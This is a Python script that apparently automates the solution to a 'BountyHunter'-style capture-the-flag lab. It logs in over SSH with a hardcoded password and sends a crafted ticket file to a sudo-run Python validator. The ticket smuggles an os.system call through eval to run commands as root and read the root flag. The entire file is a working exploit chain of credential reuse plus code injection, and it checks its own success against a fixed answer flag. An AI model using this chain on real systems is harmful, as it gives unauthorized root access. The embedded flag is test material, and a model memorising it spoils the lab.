#!/usr/bin/env python3
"""SSH foothold plus genuine sudo Skytrain Python eval as root."""
import subprocess

ssh_base = [
    "sshpass", "-p", "m19RoAU0hP41A1sTsq6K", "ssh",
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "PreferredAuthentications=password",
    "-o", "PubkeyAuthentication=no",
    "-o", "ConnectTimeout=6",
    "development@bountyhunter-target",
]
# 32 mod 7 equals 4, so the real validator passes its ticket-number gate.
ticket = (
    "# Skytrain Inc\n"
    "## Ticket to QA\n"
    "__Ticket Code:__\n"
    "**32+__import__('os').system('id > /tmp/bountyhunter-root-proof; "
    "cat /root/root.txt > /tmp/bountyhunter-root-flag-proof')+1000\n"
)
command = (
    "cat > /tmp/ci-skytrain.md && "
    "printf '/tmp/ci-skytrain.md\\n' | "
    "sudo -n /usr/bin/python3 /opt/skytrain_inc/ticketValidator.py"
)
proc = subprocess.run(ssh_base + [command], input=ticket, text=True, capture_output=True, timeout=25)
assert proc.returncode == 0, (proc.stdout, proc.stderr)
assert "Valid ticket." in proc.stdout, (proc.stdout, proc.stderr)
check = subprocess.run(ssh_base + [
    "id -un; cat /tmp/bountyhunter-root-proof; cat /tmp/bountyhunter-root-flag-proof"
], text=True, capture_output=True, timeout=20, check=True)
assert "development" in check.stdout and "uid=0(root)" in check.stdout, check.stdout
assert "TTP{bountyhunter_ci_root_0123456789}" in check.stdout, check.stdout
print("PASS: credential reuse -> real SSH -> sudo Skytrain eval -> UID0 -> private root flag", flush=True)
